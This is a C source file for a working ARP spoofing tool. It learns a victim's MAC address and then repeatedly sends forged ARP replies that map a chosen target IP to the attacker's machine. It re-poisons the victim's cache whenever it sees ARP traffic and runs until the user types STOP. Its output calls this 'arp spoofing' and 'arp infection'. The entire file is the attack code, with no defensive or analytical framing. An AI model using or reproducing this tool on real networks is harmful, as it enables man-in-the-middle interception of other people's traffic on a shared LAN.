#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <stdio.h>
#include <netinet/ip.h>
#include <libnet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/ethernet.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <time.h>
#include <pthread.h>

#define IP_ADDR_LEN 4

#pragma pack(push,1)
struct arp_packet{
	struct libnet_ethernet_hdr ETH_hdr;
	struct libnet_arp_hdr ARP_hdr;
	uint8_t src_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr src_pro_addr;
	uint8_t des_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr des_pro_addr;
};
#pragma pack(pop)

struct THREAD_DATA{
	pcap_t * _fp;
	unsigned int * _status;
	unsigned int _time_interval;
	struct arp_packet * _packet;
};

int getMacAddress(uint8_t * my_mac, char * interface)
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		printf("Error - socket\n");
		return 0;
	}

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
        {
                printf("Error - get my_mac\n");
		close(sock);
                return 0;
        }
	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
	

	close(sock);
	return 0;
	
}

int getIpAddress(struct in_addr * my_ip, char * interface)
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
        {
                printf("Error - socket\n");
                return 0;
        }

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
        {
                printf("Error - get my_ip\n");
                close(sock);
                return 0;
        }
	
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
        *my_ip = sin->sin_addr;

        close(sock);
        return 0;

}


int print_packet(struct arp_packet * packet)
{	
	printf("--------packet data--------\n");
	printf("ether_dhost	: %02x:%02x:%02x:%02x:%02x:%02x\n",
	  packet->ETH_hdr.ether_dhost[0],
	  packet->ETH_hdr.ether_dhost[1],
	  packet->ETH_hdr.ether_dhost[2],
	  packet->ETH_hdr.ether_dhost[3],
	  packet->ETH_hdr.ether_dhost[4],
	  packet->ETH_hdr.ether_dhost[5]);

	printf("ether_shost     : %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->ETH_hdr.ether_shost[0],
          packet->ETH_hdr.ether_shost[1],
          packet->ETH_hdr.ether_shost[2],
          packet->ETH_hdr.ether_shost[3],
          packet->ETH_hdr.ether_shost[4],
          packet->ETH_hdr.ether_shost[5]);

	printf("ether_type	: %04x\n", ntohs(packet->ETH_hdr.ether_type));

	printf("ar_hrd		: %04x\n", ntohs(packet->ARP_hdr.ar_hrd));
	printf("ar_pro          : %04x\n", ntohs(packet->ARP_hdr.ar_pro));
	printf("ar_hln          : %02x\n", packet->ARP_hdr.ar_hln);
	printf("ar_pln          : %02x\n", packet->ARP_hdr.ar_pln);
	printf("ar_op		: %04x\n", ntohs(packet->ARP_hdr.ar_op));

	printf("src_hdr_addr	: %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->src_hrd_addr[0],
          packet->src_hrd_addr[1],
          packet->src_hrd_addr[2],
          packet->src_hrd_addr[3],
          packet->src_hrd_addr[4],
          packet->src_hrd_addr[5]);

	printf("src_pro_addr	: %s\n", inet_ntoa(packet->src_pro_addr));

	printf("des_hdr_addr    : %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->des_hrd_addr[0],
          packet->des_hrd_addr[1],
          packet->des_hrd_addr[2],
          packet->des_hrd_addr[3],
          packet->des_hrd_addr[4],
          packet->des_hrd_addr[5]);

        printf("des_pro_addr    : %s\n", inet_ntoa(packet->des_pro_addr));

	return 0;
}

void make_arp_packet(	struct arp_packet * packet, uint8_t ether_dhost[], uint8_t ether_shost[], uint16_t ether_type, 
			uint16_t arp_hrd_type, uint16_t arp_pro_type, uint8_t arp_hlen, uint8_t arp_plen, 
			uint16_t arp_opcode, uint8_t src_hrd_addr[ETHER_ADDR_LEN], struct in_addr * src_pro_addr, 
			uint8_t des_hrd_addr[ETHER_ADDR_LEN], struct in_addr * des_pro_addr)
{
	uint16_t tmp = ntohs(ether_type);
	memcpy(packet->ETH_hdr.ether_dhost, ether_dhost, ETHER_ADDR_LEN);     
        memcpy(packet->ETH_hdr.ether_shost, ether_shost, ETHER_ADDR_LEN);
        memcpy(&packet->ETH_hdr.ether_type, &tmp, 2);            

	tmp = ntohs(arp_hrd_type);
        memcpy(&packet->ARP_hdr.ar_hrd, &tmp, 2);
	tmp = ntohs(arp_pro_type);
        memcpy(&packet->ARP_hdr.ar_pro, &tmp, 2);
        memcpy(&packet->ARP_hdr.ar_hln, &arp_hlen, 1);                      
        memcpy(&packet->ARP_hdr.ar_pln, &arp_plen, 1);                      
	tmp = ntohs(arp_opcode);
        memcpy(&packet->ARP_hdr.ar_op, &tmp, 2);

        memcpy(packet->src_hrd_addr, src_hrd_addr, ETHER_ADDR_LEN);          
        memcpy(&packet->src_pro_addr, src_pro_addr, sizeof(struct in_addr));
        memcpy(packet->des_hrd_addr, des_hrd_addr, ETHER_ADDR_LEN);         
        memcpy(&packet->des_pro_addr, des_pro_addr, sizeof(struct in_addr));
}

void *t_arp_infection(void *th_data)
{
	pcap_t *fp;
	unsigned int *status, time_interval;
	struct arp_packet * packet;
	struct THREAD_DATA * arg = (struct THREAD_DATA *)th_data;
	fp = arg->_fp;
	status = arg->_status;
	time_interval = arg->_time_interval;
	packet = arg->_packet;
	
	print_packet(packet);
	
	while(*status)
	{	
		if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(arp_packet)))                    // send packet
        	{
                	fprintf(stderr, "\nError sending the packet\n");
	                exit(0);
        	}
	        printf("--------arp infection--------\n");	

		sleep(time_interval);
	}
	printf("[*] arp infection stoped!!\n");
}

void * t_check_stop(void * th_data)
{
	unsigned int *status;
	status = (unsigned int *)th_data;
	char buff[10];
	char STOP[10] = "STOP";
	while(1)
	{
		scanf("%s", buff);
		if(strcmp(STOP, buff)==0) break; 
	}
	*status = 0;
}

int main(int argc, char* argv[])
{	
	pcap_t *fp;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (fp == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	if (argc < 4 || argc %2 == 1){
		printf("Error, give me correct arguments\n");
		return -1;
	}
	pthread_t p_infection_th, p_check_th;
	int thr_id;
	struct THREAD_DATA th_data;
	unsigned int status = 1;
	unsigned int time_interval;
	printf("Give me arp infection time interval(sec) : ");
	scanf("%d", &time_interval);

	uint8_t my_mac[ETHER_ADDR_LEN], sender_mac[ETHER_ADDR_LEN];
	uint8_t BROADCAST_MAC[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	uint8_t BROADCAST_MAC2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	struct in_addr * my_ip, *sender_ip, *target_ip;
	my_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
	sender_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
	target_ip = (struct in_addr *)calloc(1, sizeof(in_addr));
	struct arp_packet * packet, *th_packet;
	packet = (struct arp_packet *)calloc(1, sizeof(arp_packet));
	th_packet = (struct arp_packet *)calloc(1, sizeof(arp_packet));

	uint16_t ether_type = ETHERTYPE_ARP;							// ARP	: 0x0806
	uint16_t arp_hrd_type = ARPHRD_ETHER;							// Ethernet : 0x0001
	uint16_t arp_pro_type =ETHERTYPE_IP;							// IPv4	: 0x0800
	uint16_t arp_opcode = ARPOP_REQUEST;							// request : 0x0001
	
	getMacAddress(my_mac, argv[1]);								// get my mac, ip
	getIpAddress(my_ip, argv[1]);
	inet_aton(argv[2], sender_ip);								// get sender ip
	inet_aton(argv[3], target_ip);								// get target ip
	
	make_arp_packet(packet, BROADCAST_MAC, my_mac, ether_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
			IP_ADDR_LEN, arp_opcode, my_mac, my_ip, BROADCAST_MAC2, sender_ip);

//	print_packet(packet);
	
	if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(struct arp_packet)))		// send packet
	{
		fprintf(stderr, "\nError sending the packet\n");
		return -1;
	}
		
	printf("--------send broadcast arp packet!--------\n");

	while (true){
		struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* ETH_header;
		const u_char* rcv_packet;
		u_char * src_hrd_addr;
		struct in_addr* src_pro_addr;
		u_char * des_hrd_addr;
		struct in_addr* des_pro_addr;
		int res = pcap_next_ex(fp, &header, &rcv_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
//		printf("%u bytes captured\n", header->caplen);

		ETH_header = (libnet_ethernet_hdr *)rcv_packet;
		if(ntohs(ETH_header->ether_type) != ETHERTYPE_ARP)				// if not ARP
//			printf("ETH type : %04x	-> It's ARP!\n", ntohs(ETH_header->ether_type));
//		else {
			continue;
//		}

		rcv_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
		src_hrd_addr = (u_char *)rcv_packet;
		rcv_packet += ETHER_ADDR_LEN;
		src_pro_addr = (in_addr *)rcv_packet;
		rcv_packet += sizeof(struct in_addr);
		des_hrd_addr = (u_char *)rcv_packet;
                rcv_packet += ETHER_ADDR_LEN;
                des_pro_addr = (in_addr *)rcv_packet;

		if(strcmp(inet_ntoa(*sender_ip), inet_ntoa(*src_pro_addr)) == 0)		// src_pro_addr == sender_ip
		{
			if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) == 0)		// des_pro_addr== my_ip
			{
				printf("--------sender mac get!!--------\n");
				memcpy(sender_mac, src_hrd_addr, ETHER_ADDR_LEN);		// sender mac get
				break;
			}
		} 
	}	
	
	arp_opcode = ARPOP_REPLY;								// reply : 2
	make_arp_packet(packet, sender_mac, my_mac, ether_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
			IP_ADDR_LEN, arp_opcode, my_mac, target_ip, sender_mac, sender_ip);

	memcpy(th_packet, packet, sizeof(arp_packet));

//	print_packet(packet);	

	th_data._fp = fp;
	th_data._status = &status;
	th_data._time_interval = time_interval;
	th_data._packet = th_packet;

	printf("--------arp spoofing start!, type 'STOP' when you want to stop this attack--------\n");
	
	thr_id = pthread_create(&p_check_th, NULL, t_check_stop, (void *)&status);
	if (thr_id < 0)
	{
		perror("thread create error : ");
        	exit(0);
    	}
	pthread_detach(p_check_th);

	thr_id = pthread_create(&p_infection_th, NULL, t_arp_infection, (void *)&th_data);
        if (thr_id < 0)
        {
                perror("thread create error : ");
                exit(0);
        }
	pthread_detach(p_infection_th);

/*
        if(pcap_sendpacket(fp, (unsigned char *)packet, sizeof(arp_packet)))			// send packet
        {
                fprintf(stderr, "\nError sending the packet\n");
                return -1;
        }

	printf("--------send arp attack!--------\n");
*/	
	free(my_ip);
	free(sender_ip);
	free(target_ip);
	free(packet);
	
	while (status){
                struct pcap_pkthdr* header;
                struct libnet_ethernet_hdr* ETH_header;
                const u_char* rcv_packet;
                u_char * src_hrd_addr;
                struct in_addr* src_pro_addr;
                u_char * des_hrd_addr;
                struct in_addr* des_pro_addr;
                int res = pcap_next_ex(fp, &header, &rcv_packet);
                if (res == 0) continue;
                if (res == -1 || res == -2) break;
//              printf("%u bytes captured\n", header->caplen);

                ETH_header = (libnet_ethernet_hdr *)rcv_packet;
		if(ntohs(ETH_header->ether_type) == ETHERTYPE_ARP){                            	// if ARP
                      	if(pcap_sendpacket(fp, (unsigned char *)th_packet, sizeof(arp_packet)))	// send packet
        		{
                		fprintf(stderr, "\nError sending the packet\n");
		                return -1;
		        }
		        printf("--------arp infection! by catching arp-table change--------\n");	 
			continue;
		}
/*
                rcv_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
                src_hrd_addr = (u_char *)rcv_packet;
                rcv_packet += ETHER_ADDR_LEN;
                src_pro_addr = (in_addr *)rcv_packet;
                rcv_packet += sizeof(struct in_addr);
                des_hrd_addr = (u_char *)rcv_packet;
                rcv_packet += ETHER_ADDR_LEN;
                des_pro_addr = (in_addr *)rcv_packet;

                if(strcmp(inet_ntoa(*sender_ip), inet_ntoa(*src_pro_addr)) == 0)                // src_pro_addr == sender_ip
                {
                        if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) == 0)            // des_pro_addr== my_ip
                        {
                                printf("--------sender mac get!!--------\n");
                                memcpy(sender_mac, src_hrd_addr, ETHER_ADDR_LEN);               // sender mac get
                                break;
                        }
                }
*/
        }

	sleep(time_interval);

	free(th_packet);
	printf("--------Successful Program End--------\n");
	
	return 0;
}
